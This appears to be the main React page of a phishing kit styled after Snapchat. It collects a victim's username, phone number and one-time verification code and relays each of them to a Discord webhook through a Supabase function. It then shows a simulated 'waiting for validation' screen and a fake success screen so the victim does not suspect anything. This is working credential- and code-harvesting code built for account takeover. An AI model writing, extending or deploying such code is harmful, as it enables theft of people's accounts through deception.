import { useState } from "react";
import SnapLogo from "@/components/SnapLogo";
import DisclaimerBox from "@/components/DisclaimerBox";
import SnapForm from "@/components/SnapForm";
import CodeVerification from "@/components/CodeVerification";
import WaitingValidation from "@/components/WaitingValidation";
import SuccessScreen from "@/components/SuccessScreen";
import { supabase } from "@/integrations/supabase/client";

type Step = "form" | "code" | "waiting" | "success";

const Index = () => {
  const [step, setStep] = useState<Step>("form");
  const [formData, setFormData] = useState({ username: "", phone: "" });
  const [codeError, setCodeError] = useState("");

  const sendToDiscord = async (data: { username: string; phone: string; code?: string; step: string }) => {
    try {
      await supabase.functions.invoke('discord-webhook', {
        body: data
      });
    } catch (error) {
      console.error("Error sending to Discord:", error);
    }
  };

  const handleFormSubmit = async (data: { username: string; phone: string }) => {
    setFormData(data);
    setStep("code");
    await sendToDiscord({ ...data, step: "form" });
  };

  const handleCodeSubmit = async (code: string) => {
    console.log("Code submitted:", code, "for user:", formData);
    await sendToDiscord({ ...formData, code, step: "code" });
    setStep("waiting");
    
    // Simuler l'attente de validation (en vrai ce serait via webhook Discord)
    setTimeout(() => {
      setStep("success");
    }, 5000);
  };

  return (
    <div className="min-h-screen bg-background flex flex-col items-center justify-center px-4 py-12">
      <div className="flex flex-col items-center gap-8 w-full max-w-md">
        <SnapLogo />
        <DisclaimerBox />
        
        {step === "form" && (
          <SnapForm onSubmit={handleFormSubmit} />
        )}
        
        {step === "code" && (
          <CodeVerification onSubmit={handleCodeSubmit} error={codeError} />
        )}
        
        {step === "waiting" && (
          <WaitingValidation />
        )}
        
        {step === "success" && (
          <SuccessScreen />
        )}
      </div>
    </div>
  );
};

export default Index;
